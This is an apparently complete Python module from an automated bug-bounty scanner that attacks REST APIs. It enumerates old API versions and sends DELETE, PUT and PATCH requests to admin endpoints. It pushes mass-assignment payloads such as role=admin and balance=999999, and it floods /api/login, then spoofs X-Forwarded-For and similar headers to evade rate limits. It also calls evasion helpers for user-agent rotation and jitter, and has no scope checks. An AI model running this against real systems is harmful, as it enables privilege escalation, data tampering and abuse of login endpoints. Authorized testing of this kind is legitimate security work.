#!/usr/bin/env python3
# modules/step44_api_security.py — API Security Testing V7
# NEW MODULE: REST API mass assignment, broken function auth, rate limit bypass,
#             API versioning, excessive data exposure, BFLA
# Source: Bug Bounty Bootcamp Ch20 — API security testing methodology
# MilkyWay Intelligence | Author: Sharlix + M7AI

import re, json, urllib.request, urllib.error, urllib.parse
from core.utils import safe_read

# ── API version paths to test ────────────────────────────────────────────────
API_VERSIONS = [
    "/api/v1","/api/v2","/api/v3","/api/v4",
    "/api/beta","/api/alpha","/api/old","/api/legacy",
    "/api/2","/api/3","/api/2024","/api/dev",
    "/v1","/v2","/v3","/v4","/v1.0","/v2.0",
]

# ── Common API endpoints ──────────────────────────────────────────────────────
API_ENDPOINTS = [
    "/users","/user","/accounts","/account",
    "/orders","/order","/payments","/products",
    "/admin","/admin/users","/internal","/private",
    "/export","/import","/backup","/dump",
    "/config","/settings","/debug","/test",
    "/keys","/tokens","/secrets","/credentials",
]

# ── HTTP methods to test (BFLA) ───────────────────────────────────────────────
HTTP_METHODS = ["GET","POST","PUT","PATCH","DELETE","OPTIONS","HEAD","TRACE"]

# ── Excessive data exposure indicators ───────────────────────────────────────
SENSITIVE_FIELDS = [
    "password","password_hash","pwd","secret","api_key","apikey",
    "token","access_token","refresh_token","private_key","secret_key",
    "ssn","social_security","credit_card","card_number","cvv",
    "bank_account","routing_number","pin","otp","mfa_secret",
    "internal_id","admin_note","is_admin","is_internal","role",
    "salary","balance","credit","subscription_key",
]

# ── Mass assignment fields ────────────────────────────────────────────────────
MASS_ASSIGN_TEST = {
    "role":         "admin",
    "isAdmin":      True,
    "is_admin":     True,
    "admin":        True,
    "verified":     True,
    "email_verified": True,
    "balance":      999999,
    "credits":      999999,
    "subscription": "premium",
    "account_type": "admin",
    "permissions":  ["admin","write","read","delete"],
}


class Step44ApiSecurity:
    """
    API Security Testing.
    Bug Bounty Bootcamp Ch20:
    1. API version enumeration (v1/v2 may have looser security)
    2. Broken Function Level Authorization (BFLA)
    3. Excessive data exposure (API returns too much data)
    4. Mass assignment via API
    5. API rate limit bypass (header manipulation)
    6. GraphQL and REST object-level auth
    """

    def __init__(self, pipeline):
        self.p = pipeline

    def run(self):
        p     = self.p
        out   = p.files.get("api_results",
                             f"{p.out}/{p.prefix}_api_security.txt")
        live  = safe_read(p.files.get("fmt_url",""))[:10]
        urls  = safe_read(p.files.get("urls",""))
        found = 0

        if not live:
            p.log.warn("API Security: no live hosts"); return

        auth_h = self._build_auth(p)
        p.log.info(f"API Security V7: {len(live)} hosts — BFLA+exposure+mass+version+ratelimit")

        for host in live[:5]:
            host = host.rstrip("/")

            # Phase 1: API version enumeration
            r = self._test_api_versions(host, auth_h, out)
            found += r

            # Phase 2: Broken Function Level Authorization
            r = self._test_bfla(host, auth_h, out)
            found += r

            # Phase 3: Excessive data exposure
            r = self._test_data_exposure(host, urls, auth_h, out)
            found += r

            # Phase 4: Mass assignment via API
            r = self._test_api_mass_assign(host, auth_h, out)
            found += r

            # Phase 5: Rate limit bypass
            r = self._test_rate_limit_bypass(host, auth_h, out)
            found += r

            p.bypass.jitter()

        p.log.success(f"API Security V7: {found} findings")

    # ── Phase 1: API version enumeration ─────────────────────────────────────
    def _test_api_versions(self, host: str, auth_h: dict, out: str) -> int:
        """
        BB Bootcamp Ch20: older API versions often have weaker security.
        v1 may lack auth, v2 may have different behavior.
        """
        found    = 0
        versions = {}

        for ver in API_VERSIONS:
            url  = host + ver
            resp = self._fetch(url, auth_h)
            if not resp: continue
            st   = resp.get("status",0)
            body = resp.get("body","")

            if st in (200, 201) and len(body) > 20:
                versions[ver] = st
                # Check if this version differs from latest
                if any(x in body.lower() for x in
                       ["deprecated","legacy","v1","old version"]):
                    detail = (f"Old API version accessible: {ver} "
                              f"(may have weaker security controls)")
                    self._save(out,"medium","OLD_API_VERSION",url,detail)
                    found += 1

        if len(versions) > 2:
            detail = (f"Multiple API versions: {list(versions.keys())[:5]} — "
                      f"test each for different auth requirements")
            self._save(out,"info","API_VERSION_ENUM",host,detail)
        return found

    # ── Phase 2: BFLA ────────────────────────────────────────────────────────
    def _test_bfla(self, host: str, auth_h: dict, out: str) -> int:
        """
        BB Bootcamp Ch20: Broken Function Level Authorization.
        Test HTTP methods not intended to be accessible.
        """
        found = 0
        for path in API_ENDPOINTS[:10]:
            base_url = host + path

            # First check which methods respond
            opts = self._fetch(base_url, {**auth_h,
                                          "Content-Type":"application/json"},
                               method="OPTIONS")
            allowed = ""
            if opts:
                allowed = opts.get("headers",{}).get("allow","")

            for method in HTTP_METHODS:
                if method == "GET": continue  # Normal
                if allowed and method not in allowed: continue

                resp = self._fetch(base_url, auth_h, method=method)
                if not resp: continue
                st   = resp.get("status",0)
                body = resp.get("body","")

                # Unexpected success on admin methods
                if st in (200,201,204) and method in ("DELETE","PUT","PATCH"):
                    detail = (f"BFLA: {method} {path} returned {st} — "
                              f"unauthorized method accepted")
                    self._save(out,"high","BFLA",base_url,detail)
                    found += 1

                # TRACE method = XSS risk
                if method == "TRACE" and st == 200 and "TRACE" in body:
                    detail = f"TRACE method enabled at {path} — reflects headers"
                    self._save(out,"medium","TRACE_ENABLED",base_url,detail)
                    found += 1
        return found

    # ── Phase 3: Excessive data exposure ─────────────────────────────────────
    def _test_data_exposure(self, host: str, urls: list,
                             auth_h: dict, out: str) -> int:
        """
        BB Bootcamp Ch20: API returns fields client shouldn't see.
        """
        found = 0
        api_urls = ([u for u in urls if "/api/" in u and "?" not in u][:20] +
                    [host + ep for ep in API_ENDPOINTS[:10]])

        for url in api_urls[:25]:
            resp = self._fetch(url, auth_h)
            if not resp or resp.get("status",0) not in (200,201):
                continue
            body = resp.get("body","")
            ct   = resp.get("headers",{}).get("content-type","")

            if "json" not in ct and not body.strip().startswith("{"):
                continue

            # Check for sensitive fields in response
            exposed = []
            body_lower = body.lower()
            for field in SENSITIVE_FIELDS:
                if f'"{field}"' in body_lower or f"'{field}'" in body_lower:
                    exposed.append(field)

            if exposed:
                detail = (f"Excessive data exposure: fields "
                          f"{exposed[:5]} in response from {url[:60]}")
                sev = "critical" if any(
                    x in exposed for x in
                    ["password","credit_card","ssn","private_key"]
                ) else "high"
                self._save(out, sev, "EXCESSIVE_DATA_EXPOSURE", url, detail)
                found += 1
        return found

    # ── Phase 4: Mass assignment ──────────────────────────────────────────────
    def _test_api_mass_assign(self, host: str, auth_h: dict, out: str) -> int:
        found = 0
        for path in ["/api/user","/api/me","/api/profile","/api/account",
                     "/api/v1/user","/api/v2/user"]:
            url = host + path

            # GET baseline
            base = self._fetch(url, auth_h)
            if not base or base.get("status",0) not in (200,201):
                continue

            # PUT/PATCH with extra privileged fields
            for field, value in list(MASS_ASSIGN_TEST.items())[:5]:
                body = json.dumps({field: value})
                for method in ["PUT","PATCH"]:
                    resp = self._fetch(url, {**auth_h,
                                             "Content-Type":"application/json"},
                                       method=method, body=body)
                    if not resp: continue
                    st   = resp.get("status",0)
                    resp_body = resp.get("body","")

                    if st in (200,201,204):
                        # Check if field was accepted
                        if (str(value).lower() in resp_body.lower() or
                                field in resp_body.lower()):
                            detail = (f"API Mass Assignment: {method} {path} "
                                      f"accepted privileged field "
                                      f"'{field}'={value}")
                            self._save(out,"critical","API_MASS_ASSIGNMENT",
                                       url, detail)
                            found += 1
                            break
        return found

    # ── Phase 5: Rate limit bypass ────────────────────────────────────────────
    def _test_rate_limit_bypass(self, host: str, auth_h: dict, out: str) -> int:
        """
        BB Bootcamp Ch20: bypass rate limits with header manipulation.
        """
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"},
            {"X-Forwarded-For": "8.8.8.8"},
        ]

        found = 0
        # First trigger a rate limit
        test_url = host + "/api/login"
        baseline = self._fetch(test_url, auth_h)
        if not baseline: return 0

        base_st = baseline.get("status", 0)

        # Flood to trigger rate limit
        for i in range(8):
            r = self._fetch(test_url, auth_h)
            if r and r.get("status",0) == 429:
                # Rate limit found — now try bypass headers
                for bypass_hdr in bypass_headers:
                    hdrs = {**auth_h, **bypass_hdr}
                    bypass_resp = self._fetch(test_url, hdrs)
                    if bypass_resp and bypass_resp.get("status",0) != 429:
                        detail = (f"Rate limit bypass: {list(bypass_hdr.keys())[0]}"
                                  f"={list(bypass_hdr.values())[0]} bypasses "
                                  f"rate limit at /api/login")
                        self._save(out,"high","RATE_LIMIT_BYPASS",test_url,detail)
                        found += 1
                        break
                break
        return found

    # ── Helpers ───────────────────────────────────────────────────────────────
    def _build_auth(self, p) -> dict:
        hdrs = {}
        c = getattr(p.args,"cookie",None) or getattr(p.args,"session",None)
        a = getattr(p.args,"authorization",None) or getattr(p.args,"auth",None)
        if c: hdrs["Cookie"] = c
        if a: hdrs["Authorization"] = a if a.startswith("Bearer") else f"Bearer {a}"
        return hdrs

    def _fetch(self, url: str, auth: dict, method: str = "GET",
               body: str = None, timeout: int = 8) -> dict:
        try:
            data = body.encode() if body else None
            req  = urllib.request.Request(
                url, data=data, headers={
                    **auth, "User-Agent": self.p.bypass.ua(),
                    "Accept": "application/json",
                }, method=method)
            resp = urllib.request.urlopen(req, timeout=timeout)
            hdrs = {k.lower(): v for k,v in resp.headers.items()}
            return {"status": resp.status,
                    "body": resp.read(30000).decode("utf-8","ignore"),
                    "headers": hdrs}
        except urllib.error.HTTPError as e:
            hdrs = {k.lower():v for k,v in e.headers.items()}
            try: body_r = e.read(2000).decode("utf-8","ignore")
            except: body_r = ""
            return {"status": e.code, "body": body_r, "headers": hdrs}
        except Exception:
            return None

    def _save(self, out, sev, vtype, url, detail, response: str = "", payload: str = ""):
        with open(out,"a") as f:
            f.write(f"{vtype}: {url} | {detail}\n")
        self.p.add_finding(sev, vtype, url, detail, "api-security-v7", response=response, payload=payload)
